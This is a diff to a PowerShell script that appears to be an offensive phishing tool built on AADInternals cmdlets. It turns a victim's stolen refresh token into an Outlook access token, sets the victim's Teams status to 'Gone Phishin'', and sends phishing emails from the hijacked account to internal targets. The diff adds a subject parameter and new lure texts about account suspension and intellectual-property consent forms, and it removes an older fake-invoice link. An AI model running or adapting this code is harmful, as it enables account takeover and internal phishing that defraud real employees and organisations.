@@ -5,6 +5,8 @@ param (
     [Parameter(ValueFromPipelineByPropertyName=$true)]
     [string]$messageContent,
     [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [string]$subject,
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
     [string]$Token
 )
 
@@ -192,20 +194,19 @@ $jsonData | Out-File -FilePath "$user.teams.json"
 $retryDelay = 5
 
 ### Phishing Message Content
-if (-not $messageContent) {
-    $messageContent = "Did you see how much money the accounting department lost this year? Here take a look https://invoice.azurewebsites.net/index.html"
-}
 
 $At=Invoke-RefreshToOutlookToken -domain $domain -refreshtoken $response.refresh_token
 Add-AADIntAccessTokenToCache -AccessToken $At.access_token -RefreshToken $At.refresh_token
 
 ### Teams Messages - Send over Teams
-$teamsMessage = @{
-    Body = @{
-        ContentType = "html"
-        Content = $messageContent
-    }
-}
+# $teamsMessage = @{
+#     Body = @{
+#         ContentType = "html"
+#         Content = $messageContent
+#     }
+# }
+
+$teamsMessage = $messageContent
 
 
 ### Teams Messages - Function to handle message sending with retry logic
@@ -252,7 +253,8 @@ if ($targetUser) {
         Set-AADIntTeamsStatusMessage -Message "Gone Phishin'" -AccessToken $MSTeamsToken.access_token -Verbose
         # Send-TeamsMessageWithRetry -Recipient $targetUser -Message $teamsMessage
         $mailuser = $targetUser
-        $subject = "Your account has been disabled"
+        if(!($subject)){$subject = "Third-Party Consent for use of your company's intellectual property"}
+        if(!($messageContent)) { $messageContent = "We have been trying to reach you regarding use of your company's work in our upcoming calendar, please review these forms if you have any concerns or wish to object usage of your logo, etc, etc"}
         Send-AADIntOutlookMessage -AccessToken $At.access_token -Recipient $mailUser -Subject $subject -Message $teamsMessage
     }
 } else {
